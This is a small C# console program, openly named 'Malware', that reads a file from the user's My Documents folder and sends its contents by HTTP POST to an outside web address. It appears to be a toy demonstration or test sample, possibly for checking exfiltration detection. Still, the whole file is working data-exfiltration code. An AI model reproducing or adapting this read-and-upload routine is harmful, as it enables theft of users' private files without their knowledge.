using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;
using System.Net;

namespace Malware
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("\nMalware starting up.");
            HttpWebRequest hwr = null;
            try
            {
                string input;
                using (StreamReader sr = new StreamReader(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + @"\blah.txt"))
                {
                    input = sr.ReadToEnd();
                }

                hwr = (HttpWebRequest)WebRequest.Create("http://www.gmail.com");

                hwr.Method = "POST";
                using (StreamWriter outputStream = new StreamWriter(hwr.GetRequestStream()))
                {
                    outputStream.Write(input);
                }
                HttpWebResponse response = (HttpWebResponse)hwr.GetResponse();
            }
            catch (Exception e)
            {
                Console.WriteLine("Exception: " + e.ToString());
            }
            finally
            {
                if (hwr != null)
                    hwr.Abort();
            }
            Console.WriteLine("Malware finished.");
        }
    }
}
